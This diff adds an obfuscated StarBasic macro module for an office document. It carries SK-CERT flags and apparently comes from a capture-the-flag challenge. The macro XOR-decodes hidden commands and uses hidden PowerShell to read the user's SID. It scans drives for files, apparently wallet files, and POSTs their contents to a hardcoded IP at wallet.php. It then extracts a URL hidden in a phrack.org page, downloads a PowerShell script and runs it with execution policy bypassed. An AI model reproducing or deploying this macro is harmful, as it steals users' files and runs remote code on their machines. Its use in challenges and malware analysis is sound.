@@ -1,0 +1,127 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
+<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****
+
+Sub Main
+&apos; SK-CERT{h3ll4_3v1l_m4cr0}
+Dim e82120f6eb877385243aae15d92e7e641 As String
+Dim r81643b7f624a34b70d8ee428e5759613 As String
+Dim n47f919f310871c4bfd51cf0709ca166d As String
+Dim y421397a92abea5ac103badbf0fbf92bc As String
+Dim b1f180003f7ceaef3db1c314f23e4d02f As Integer
+Dim t8952b08f7910617055c3fad1f50f57d4() As String
+Dim n39e679f588e34f4d95d0be86d9db053b As Integer
+n47f919f310871c4bfd51cf0709ca166d = &quot;27 36 1C 13 2A 22 2F 37 2D 21 58 58 1B 08 05 22 38 2E 18 02 21 3D 22 72 29 24 1C 11 09 0F 4B 66 7A 3A 04 1B 35 30 29 36 61 0A 3D 21 41 22 23 0F 1B 1D 22 22 1D 1C 67 7F 11 2C 0C 1D 4C&quot;
+y421397a92abea5ac103badbf0fbf92bc = &quot;77 74 39 13 3B 24 35 21 24 6D 55 1C 02 02 07 33 33 3C 4B 23 0C 12 6A 7F 6B 61 52 02 0D 0D 07 23 23 73 47 5C 68 29 1C 33 6C 2B 39 58 2A 51 46 7F 0A 73 4B 0A 78 74 67 29 61 69 27 5B 2A 14 07 2A 19 38 06 13 78 2C 67 71 61 1E 33 58 2F 24 39 12 2C 2E 58 29 2F 65 29 26 1E 3E 48 18 5F 3E 1C 72 3B 35 58 02 6D 2C&quot;
+r81643b7f624a34b70d8ee428e5759613 = &quot;WYkvXQGRAMxulakF&quot;
+n47f919f310871c4bfd51cf0709ca166d = tef891184c4e4eb93f9dfc49ef3ef1a3d(n47f919f310871c4bfd51cf0709ca166d)
+nb10e22222b650a986497e7bd70ae44d7(n47f919f310871c4bfd51cf0709ca166d, r81643b7f624a34b70d8ee428e5759613)
+y421397a92abea5ac103badbf0fbf92bc = tef891184c4e4eb93f9dfc49ef3ef1a3d(y421397a92abea5ac103badbf0fbf92bc)
+nb10e22222b650a986497e7bd70ae44d7(y421397a92abea5ac103badbf0fbf92bc, r81643b7f624a34b70d8ee428e5759613)
+For i = 65 To 90
+b785a6ee17ac0dc3c19e0ceeee71121b8 = &quot;&quot;
+neba0332859988d63228be9264038544f = &quot;&quot;
+b785a6ee17ac0dc3c19e0ceeee71121b8 = chr(i) &amp; &quot;:\&quot;
+neba0332859988d63228be9264038544f = Dir(b785a6ee17ac0dc3c19e0ceeee71121b8, vbDirectory)
+If neba0332859988d63228be9264038544f = &quot;&quot; Then
+Else
+n39e679f588e34f4d95d0be86d9db053b = 0
+xefc930b38ecd11d422d911ed10897c1f = &quot;powershell -windowstyle hidden  -command Get-LocalUser -Name $env:USERNAME | Select sid&quot;
+e82120f6eb877385243aae15d92e7e641 = CreateObject(&quot;WScript.Shell&quot;).Exec(xefc930b38ecd11d422d911ed10897c1f).StdOut.ReadAll
+nd97986fdd077e026409f51bd276388f5 = b785a6ee17ac0dc3c19e0ceeee71121b8 &amp; &quot;Windows&quot;
+neba0332859988d63228be9264038544f = Dir(nd97986fdd077e026409f51bd276388f5, vbDirectory)
+If neba0332859988d63228be9264038544f = &quot;&quot; Then
+xefc930b38ecd11d422d911ed10897c1f = n47f919f310871c4bfd51cf0709ca166d &amp; b785a6ee17ac0dc3c19e0ceeee71121b8 &amp; y421397a92abea5ac103badbf0fbf92bc
+Else
+xefc930b38ecd11d422d911ed10897c1f = n47f919f310871c4bfd51cf0709ca166d &amp; b785a6ee17ac0dc3c19e0ceeee71121b8 &amp; &quot;Users\&quot; &amp; y421397a92abea5ac103badbf0fbf92bc
+n39e679f588e34f4d95d0be86d9db053b = 1
+End If
+n6ffaff2c74a594fd2862378875a20cde = CreateObject(&quot;WScript.Shell&quot;).Exec(xefc930b38ecd11d422d911ed10897c1f).StdOut.ReadAll
+If n6ffaff2c74a594fd2862378875a20cde = &quot;&quot; Then
+Else
+Set b8777db0116f745e22a3374df7393d3d6 = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;)
+Dim nc6508627a975608356e338bf4c61a565 As String
+t8952b08f7910617055c3fad1f50f57d4 = Split(n6ffaff2c74a594fd2862378875a20cde, chr(13))
+For x = LBound(t8952b08f7910617055c3fad1f50f57d4()) To UBound(t8952b08f7910617055c3fad1f50f57d4())
+If zf9fe9090897bc571f34a3d710c5a0c6c(t8952b08f7910617055c3fad1f50f57d4(x)) = &quot;&quot; Then
+Else
+b1f180003f7ceaef3db1c314f23e4d02f = FreeFile
+Open zf9fe9090897bc571f34a3d710c5a0c6c(t8952b08f7910617055c3fad1f50f57d4(x)) For Input As #b1f180003f7ceaef3db1c314f23e4d02f
+y990d03aa6db9942cb5dc481ad97309fb = &quot;&quot;
+While Not EOF(b1f180003f7ceaef3db1c314f23e4d02f)
+Line Input #b1f180003f7ceaef3db1c314f23e4d02f, DataLine
+y990d03aa6db9942cb5dc481ad97309fb = y990d03aa6db9942cb5dc481ad97309fb &amp; chr(13) &amp; DataLine
+Wend
+y990d03aa6db9942cb5dc481ad97309fb = y990d03aa6db9942cb5dc481ad97309fb &amp; e82120f6eb877385243aae15d92e7e641
+y990d03aa6db9942cb5dc481ad97309fb = y990d03aa6db9942cb5dc481ad97309fb &amp; chr(13) &amp; chr(83) &amp; chr(75) &amp; chr(45) &amp; chr(67) &amp; chr(69) &amp; chr(82) &amp; chr(84) &amp; chr(123) &amp; chr(119) &amp; chr(104) &amp; chr(51) &amp; chr(114) &amp; chr(101) &amp; chr(95) &amp; chr(109) &amp; chr(121) &amp; chr(95) &amp; chr(99) &amp; chr(114) &amp; chr(121) &amp; chr(112) &amp; chr(116) &amp; chr(48) &amp; chr(95) &amp; chr(103) &amp; chr(48) &amp; chr(51) &amp; chr(115) &amp; chr(125)
+bea2b19e869d906e19c2c5845ef99d624 = chr(104)+ chr(116)+ chr(116)+ chr(112)+ chr(58)+ chr(47)+ chr(47)+ chr(49)+ chr(57)+ chr(56)+ chr(46)+ chr(49)+ chr(56)+ chr(46)+ chr(55)+ chr(46)+ chr(52)+ chr(52)+ chr(58)+ chr(56)+ chr(48)+ chr(48)+ chr(48)+ chr(47)+ chr(119)+ chr(97)+ chr(108)+ chr(108)+ chr(101)+ chr(116)+ chr(46)+ chr(112)+ chr(104)+ chr(112)
+b8777db0116f745e22a3374df7393d3d6.Open &quot;POST&quot;, bea2b19e869d906e19c2c5845ef99d624, False
+b8777db0116f745e22a3374df7393d3d6.setRequestHeader &quot;User-Agent&quot;, &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)&quot;
+b8777db0116f745e22a3374df7393d3d6.send(y990d03aa6db9942cb5dc481ad97309fb)
+t6449198e0384c06d719c5cc8e9d0f432 = b8777db0116f745e22a3374df7393d3d6.responseText
+Close #b1f180003f7ceaef3db1c314f23e4d02f
+End If
+Next x
+If n39e679f588e34f4d95d0be86d9db053b = 1 Then
+EncodedData = &quot;51 32 32 102 10 103 65 65 102 199 10 32 8 396 11 13 17 23 12 4 65 9 199 106 65 32 58 1179 9 1277 1144 7 68 5922 86 7457 34 45 49 118 46 18719 1732 18 4 68 12811 386 16 13 25 12811 18 33 12811 4 1379 5 106 1379 9 68 18774&quot;
+bea2b19e869d906e19c2c5845ef99d624 = chr(104)+ chr(116)+ chr(116)+ chr(112)+ chr(58)+ chr(47)+ chr(47)+ chr(112)+ chr(104)+ chr(114)+ chr(97)+ chr(99)+ chr(107)+ chr(46)+ chr(111)+ chr(114)+ chr(103)+ chr(47)+ chr(105)+ chr(115)+ chr(115)+ chr(117)+ chr(101)+ chr(115)+ chr(47)+ chr(55)+ chr(48)+ chr(47)+ chr(53)+ chr(46)+ chr(104)+ chr(116)+ chr(109)+ chr(108)
+b8777db0116f745e22a3374df7393d3d6.Open &quot;GET&quot;, bea2b19e869d906e19c2c5845ef99d624, False
+b8777db0116f745e22a3374df7393d3d6.setRequestHeader &quot;User-Agent&quot;, &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)&quot;
+b8777db0116f745e22a3374df7393d3d6.send()
+outputData = b8777db0116f745e22a3374df7393d3d6.responseText
+bea2b19e869d906e19c2c5845ef99d624 = &quot;&quot;
+t8952b08f7910617055c3fad1f50f57d4 = Split(EncodedData, &quot; &quot;)
+For m = LBound(t8952b08f7910617055c3fad1f50f57d4()) To UBound(t8952b08f7910617055c3fad1f50f57d4())
+bea2b19e869d906e19c2c5845ef99d624 = bea2b19e869d906e19c2c5845ef99d624 &amp; Mid(outputData, t8952b08f7910617055c3fad1f50f57d4(m), 1)
+Next m
+bea2b19e869d906e19c2c5845ef99d624 = split(bea2b19e869d906e19c2c5845ef99d624,&quot;#&quot;)(0)
+b8777db0116f745e22a3374df7393d3d6.Open &quot;GET&quot;, bea2b19e869d906e19c2c5845ef99d624, False
+b8777db0116f745e22a3374df7393d3d6.send()
+Dim fso as Object
+Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)
+Dim y0ba683a132bc63644c724ab7e1b8ca39 as Object
+Set y0ba683a132bc63644c724ab7e1b8ca39 = FSO.CreateTextFile(b785a6ee17ac0dc3c19e0ceeee71121b8 &amp; &quot;Users\Public\Documents\script.ps1&quot;)
+y0ba683a132bc63644c724ab7e1b8ca39.WriteLine b8777db0116f745e22a3374df7393d3d6.responseText
+y0ba683a132bc63644c724ab7e1b8ca39.Close
+Set fso = Nothing
+Set y0ba683a132bc63644c724ab7e1b8ca39 = Nothing
+xefc930b38ecd11d422d911ed10897c1f = &quot;powershell -windowstyle hidden -ExecutionPolicy Bypass -File &quot; &amp; b785a6ee17ac0dc3c19e0ceeee71121b8 &amp; &quot;Users\Public\Documents\script.ps1&quot;
+CreateObject(&quot;WScript.Shell&quot;).Exec(xefc930b38ecd11d422d911ed10897c1f)
+End If
+End If
+End If
+Next i
+End Sub
+Private Sub zf9fe9090897bc571f34a3d710c5a0c6c(strSource As String) As String
+Dim i As Integer
+Dim wa222f653e80d44592e6ae3a3c9b841d0 As String
+For i = 1 To Len(strSource)
+Select Case Asc(Mid(strSource, i, 1))
+Case 32 To 126:
+wa222f653e80d44592e6ae3a3c9b841d0 = wa222f653e80d44592e6ae3a3c9b841d0 &amp; Mid(strSource, i, 1)
+End Select
+Next
+zf9fe9090897bc571f34a3d710c5a0c6c = wa222f653e80d44592e6ae3a3c9b841d0
+End Sub
+Private Sub tef891184c4e4eb93f9dfc49ef3ef1a3d(ByVal HexToStr As String) As String
+Dim b0ec00fea928e2c2fab85507ac6b23ced   As String
+Dim t3fe9cf8bc7672f0b96988be5acd6b68c As String
+Dim I         As Long
+For I = 1 To Len(HexToStr) Step 3
+b0ec00fea928e2c2fab85507ac6b23ced = Chr$(Val(&quot;&amp;H&quot; &amp; Mid$(HexToStr, I, 2)))
+t3fe9cf8bc7672f0b96988be5acd6b68c = t3fe9cf8bc7672f0b96988be5acd6b68c &amp; b0ec00fea928e2c2fab85507ac6b23ced
+Next I
+tef891184c4e4eb93f9dfc49ef3ef1a3d = t3fe9cf8bc7672f0b96988be5acd6b68c
+End Sub
+Private Sub nb10e22222b650a986497e7bd70ae44d7(ByRef Text As String, ByRef r81643b7f624a34b70d8ee428e5759613 As String)
+Dim l As Long
+Dim lonLenKey As Long
+Dim lonKeyPos As Long
+lonLenKey = Len(r81643b7f624a34b70d8ee428e5759613)
+For l = 1 To Len(Text)
+lonKeyPos = lonKeyPos + 1
+If lonKeyPos &gt; lonLenKey Then lonKeyPos = 1
+Mid$(Text, l, 1) = Chr$(Asc(Mid$(Text, l, 1)) Xor Asc(Mid$(r81643b7f624a34b70d8ee428e5759613, lonKeyPos, 1)))
+Next l
+End Sub
+</script:module>vvvv
